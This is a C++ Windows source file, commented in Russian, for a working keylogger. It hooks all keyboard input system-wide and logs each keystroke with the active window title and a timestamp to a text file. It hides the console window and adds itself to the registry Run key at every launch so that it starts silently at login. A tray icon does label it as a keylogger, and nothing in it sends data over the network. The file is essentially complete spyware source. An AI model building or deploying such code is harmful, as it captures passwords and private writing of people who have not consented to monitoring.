#include <Windows.h>
#include <time.h>
#include <iostream>
#include <fstream>
#include <shellapi.h> 
#include <cstring>
using namespace std;


int Save(int key);

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
HHOOK hook;

KBDLLHOOKSTRUCT kbStruct;

ofstream file;

// Переменные для окна и трея
HWND hwnd = NULL;
NOTIFYICONDATA nid = {0};
HMENU hPopupMenu = NULL;
bool isRunning = true;

// ID для элементов
#define ID_TRAY_ICON 1001
#define IDM_EXIT 1002
#define IDM_SHOW 1003
#define IDM_CHANGE_PATH 1004
#define IDM_OPEN_FILE 1005

wchar_t logFilePath[MAX_PATH] = L"D:\\Clientkeylog.txt";
wchar_t configFilePath[MAX_PATH] = L"C:\\Users\\Public\\keylogger_config.txt";

// Функция для сохранения пути в конфиг-файл
void SaveConfigPath() {
    wchar_t dirPath[MAX_PATH];
    wcscpy_s(dirPath, configFilePath);
    
    wchar_t* lastSlash = wcsrchr(dirPath, L'\\');
    if (lastSlash) {
        *lastSlash = L'\0';
        CreateDirectory(dirPath, NULL);
    }
    
    std::ofstream configFile(configFilePath);
    if (configFile.is_open()) {
        char utf8Path[MAX_PATH * 3] = {0};
        int len = WideCharToMultiByte(CP_UTF8, 0, logFilePath, -1, utf8Path, sizeof(utf8Path), NULL, NULL);
        if (len > 0) {
            configFile << utf8Path;
        }
        configFile.close();
    }
}

// Функция для загрузки пути из конфиг-файла
void LoadConfigPath() {
    std::ifstream configFile(configFilePath);
    if (configFile.is_open()) {
        std::string line;
        if (std::getline(configFile, line)) {
            // Убираем пробелы и переводы строк
            line.erase(line.find_last_not_of(" \n\r\t") + 1);
            
            if (!line.empty()) {
                // Конвертируем из UTF-8 в wchar_t
                int wlen = MultiByteToWideChar(CP_UTF8, 0, line.c_str(), -1, NULL, 0);
                if (wlen > 0 && wlen < MAX_PATH) {
                    wchar_t* wstr = new wchar_t[wlen];
                    MultiByteToWideChar(CP_UTF8, 0, line.c_str(), -1, wstr, wlen);
                    wcscpy_s(logFilePath, wstr);
                    delete[] wstr;
                }
            }
        }
        configFile.close();
    }
}


// Добавить функцию для изменения пути сохранения
void ChangeSavePath(HWND hwnd) {
    OPENFILENAME ofn = {0};
    wchar_t newPath[MAX_PATH] = {0};
    
    wcscpy_s(newPath, logFilePath);
    
    ofn.lStructSize = sizeof(OPENFILENAME);
    ofn.hwndOwner = hwnd;
    ofn.lpstrFilter = L"Text Files (*.txt)\0*.txt\0All Files (*.*)\0*.*\0";
    ofn.lpstrFile = newPath;
    ofn.nMaxFile = MAX_PATH;
    ofn.lpstrDefExt = L"txt";
    ofn.Flags = OFN_EXPLORER | OFN_PATHMUSTEXIST | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;
    
    if (GetSaveFileName(&ofn)) {
        if (file.is_open()) {
            file.close();
        }
        
        wcscpy_s(logFilePath, newPath);

        SaveConfigPath();
        
        // Открываем файл по новому пути
        file.open(logFilePath, ios_base::app | ios_base::binary);
        
        if (file.tellp() == 0) {
            file << "\xEF\xBB\xBF"; // UTF-8 BOM
        }
        
        // Обновляем подсказку в трее
        wchar_t newTip[128];
        swprintf_s(newTip, L"Keylogger - Running\nFile: %s", logFilePath);
        wcscpy_s(nid.szTip, newTip);
        Shell_NotifyIcon(NIM_MODIFY, &nid);
        
        MessageBox(hwnd, L"Save path changed successfully!", L"Success", MB_OK | MB_ICONINFORMATION);
    }
}

// Функция создания окна
void CreateTrayWindow() {
    // Создаем невидимое окно для обработки сообщений
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = L"KeyloggerTrayClass";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW);
    
    RegisterClass(&wc);
    
    hwnd = CreateWindowEx(
        0,
        L"KeyloggerTrayClass",
        L"Keylogger Controller",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 300, 200,
        NULL, NULL, GetModuleHandle(NULL), NULL
    );
    
    // Создаем меню для иконки в трее
    hPopupMenu = CreatePopupMenu();
    AppendMenu(hPopupMenu, MF_STRING, IDM_SHOW, L"Show Info");
    AppendMenu(hPopupMenu, MF_STRING, IDM_OPEN_FILE, L"Open Log File");
    AppendMenu(hPopupMenu, MF_STRING, IDM_CHANGE_PATH, L"Change Save Path...");
    AppendMenu(hPopupMenu, MF_SEPARATOR, 0, NULL);
    AppendMenu(hPopupMenu, MF_STRING, IDM_EXIT, L"Exit");
    
    // Настраиваем иконку в трее
    nid.cbSize = sizeof(NOTIFYICONDATA);
    nid.hWnd = hwnd;
    nid.uID = ID_TRAY_ICON;
    nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    nid.uCallbackMessage = WM_APP + 1; 

    nid.hIcon = (HICON)LoadImage(
        NULL,                   
        L"",         
        IMAGE_ICON,            
        0, 0,                   
        LR_LOADFROMFILE |       
        LR_DEFAULTSIZE |         
        LR_SHARED                
    );

    wchar_t initialTip[128];
    swprintf_s(initialTip, L"Keylogger - Running\nFile: %s", logFilePath);
    wcscpy_s(nid.szTip, initialTip);
    
    Shell_NotifyIcon(NIM_ADD, &nid);

    // Прячем основное окно
    ShowWindow(hwnd, SW_HIDE);
}

void AddToStartup() {
    HKEY hKey;
    const wchar_t* runPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    if (RegOpenKeyEx(HKEY_CURRENT_USER, runPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        wchar_t exePath[MAX_PATH];
        GetModuleFileName(NULL, exePath, MAX_PATH);
        
        // Добавляем параметр для скрытого запуска
        wchar_t exePathWithParams[MAX_PATH + 10];
        swprintf_s(exePathWithParams, L"\"%s\" -silent", exePath);
        
        RegSetValueEx(hKey, L"KeyloggerApp", 0, REG_SZ, 
                      (BYTE*)exePathWithParams, 
                      (wcslen(exePathWithParams) + 1) * sizeof(wchar_t));
        
        RegCloseKey(hKey);
    }
}

// Обработчик сообщений окна
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE:
            break;
            
        case WM_APP + 1: // Пользовательское сообщение из трея
            if (lParam == WM_RBUTTONUP) {
                // Показываем меню по правому клику
                POINT pt;
                GetCursorPos(&pt);
                SetForegroundWindow(hwnd);
                TrackPopupMenu(hPopupMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hwnd, NULL);
                PostMessage(hwnd, WM_NULL, 0, 0);
            }
            else if (lParam == WM_LBUTTONDBLCLK) {
                // Двойной клик - показываем информацию
                wchar_t info[512];
                swprintf_s(info, L"Keylogger is running.\nLog file: %s\n\n"
                            L"Right-click for more options.", logFilePath);
                MessageBox(hwnd, info, L"Keylogger Info", MB_OK | MB_ICONINFORMATION);
            }
            break;
        case WM_COMMAND:
            switch (LOWORD(wParam)) {
                case IDM_SHOW:
                {
                    wchar_t info[512];
                    swprintf_s(info, L"Keylogger is running.\nLog file: %s\n\n"
                                L"To stop the keylogger, select 'Exit' from the tray menu.\n"
                                L"To change save location, select 'Change Save Path'.", 
                                logFilePath);
                    MessageBox(hwnd, info, L"Keylogger Info", MB_OK | MB_ICONINFORMATION);
                    break;
                }
                    
                case IDM_OPEN_FILE:
                    // Открываем файл в блокноте
                    ShellExecute(NULL, L"open", L"notepad.exe", logFilePath, NULL, SW_SHOW);
                    break;
                    
                case IDM_CHANGE_PATH:
                    ChangeSavePath(hwnd);
                    break;
                    
                case IDM_EXIT:
                    isRunning = false;
                    PostQuitMessage(0);
                    break;
            }
            break;
            
        case WM_DESTROY:
            // Удаляем иконку из трея перед выходом
            Shell_NotifyIcon(NIM_DELETE, &nid);
            DestroyMenu(hPopupMenu);
            PostQuitMessage(0);
            break;
            
        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}

int Save(int key){
    //Массив для хранения имени прошлого открытого окна 
    static char prevProg[256] = {0};

    //клавиши мыши
    if(key == 1 || key == 2){
        return 0;
    }

    //Дескриптор для программы, запущенной на переднем плане
    HWND foreground = GetForegroundWindow();

    //id потока
    DWORD threadId;

    //Расладка клавиатуры
    HKL keyboatdLayout;

    if(foreground){
        //Получаем id потока
        threadId = GetWindowThreadProcessId(foreground, NULL);
        //Получаем раскладку
        keyboatdLayout = GetKeyboardLayout(threadId);

        //Получаем имя окна
        char crrProg[256];
        GetWindowTextA(foreground, crrProg, sizeof(crrProg));

        if(strcmp(prevProg, crrProg) != 0){
            strcpy_s(prevProg, crrProg);     
            
            time_t t = time(NULL);

            struct tm * tm = localtime(&t);

            char c[64];

            strftime(c, sizeof(c), "%c", tm);

            //Определяем длину строки в wchar_t
            int len = MultiByteToWideChar(CP_ACP, 0, crrProg, -1, NULL, 0);
            wchar_t* wstr = new wchar_t[len];

            //Переводим строку crrProg в wchar_t
            MultiByteToWideChar(CP_ACP, 0, crrProg, -1, wstr, len);
        
            // Преобразуем из wide char в UTF-8
            int utf8_len = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
            char* utf8_str = new char[utf8_len];
            WideCharToMultiByte(CP_UTF8, 0, wstr, -1, utf8_str, utf8_len, NULL, NULL);

            file << "\n\n\n[Program: " << utf8_str << " | Date: " << c << "]";

            delete[] wstr;
            delete[] utf8_str;
        }

    }

    cout << key << endl;

    if(key == VK_BACK)
        file << "[BACKSPACE]";
    else if(key == VK_RETURN)
        file << "\n";
    else if(key == VK_SPACE)
        file << " ";
    else if(key == VK_TAB)
        file << "[TAB]";
    else if(key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
        file << "[SHIFT]";
    else if(key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
        file << "[CTR]";
    else if(key == VK_ESCAPE)
        file << "[ESC]";    
    else if(key == VK_END)
        file << "[END]";  
    else if(key == VK_HOME)
        file << "[HOME]";
    else if(key == VK_LEFT)
        file << "[LEFT]";   
    else if(key == VK_RIGHT)
        file << "[RIGHT]";   
    else if(key == VK_UP)
        file << "[UP]"; 
    else if(key == VK_DOWN)
        file << "[DOWN]";              
    else{
        wchar_t crrKey[2] = {0}; 

        // Состояние клавиатуры
        BYTE keyboardState[256]; 
    
        GetKeyboardState(keyboardState);
    
        // Преобразуем виртуальный код в символ с учетом раскладки
        int result = ToUnicodeEx(key, key, keyboardState, crrKey, 1, 0, keyboatdLayout);
    
        if (result > 0) {
            char utf8_str[8] = {0}; 

            int len = WideCharToMultiByte(CP_UTF8, 0, crrKey, -1, utf8_str, sizeof(utf8_str), NULL, NULL);
    
            if (len > 0) {
                file << utf8_str; 
            }
        }
    }

    file.flush();

    return 0;

}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam){
    if (nCode >= 0){
        //Было ли нажатие кнопки
        if(wParam == WM_KEYDOWN){
            kbStruct = *(KBDLLHOOKSTRUCT*)lParam;

            Save(kbStruct.vkCode);
        }

    }

    return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main(){

    LoadConfigPath();

    //append
    file.open(logFilePath, ios_base::app | ios_base::binary);

    bool silentMode = false;
    int argc;
    wchar_t** argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    
    if (argv && argc > 1) {
        for (int i = 1; i < argc; i++) {
            if (wcscmp(argv[i], L"-silent") == 0) {
                silentMode = true;
                break;
            }
        }
        LocalFree(argv);
    }
    
    // Всегда добавляем в автозапуск при запуске
    AddToStartup();

    if (file.tellp() == 0) {
        // UTF-8 BOM
        file << "\xEF\xBB\xBF"; 
    }
    
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), SW_HIDE);

    CreateTrayWindow();

    if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))){
        MessageBoxA(NULL, "Someting has gone wrong!", "Error", MB_ICONERROR);
    }

    MSG message;

    while (isRunning && GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    if (hook) {
        UnhookWindowsHookEx(hook);
    }
    file.close();
    
    // Обновляем подсказку в трее перед выходом
    wcscpy_s(nid.szTip, L"Keylogger - Stopped");
    Shell_NotifyIcon(NIM_MODIFY, &nid);
    Sleep(500); 
    
    return 0;
}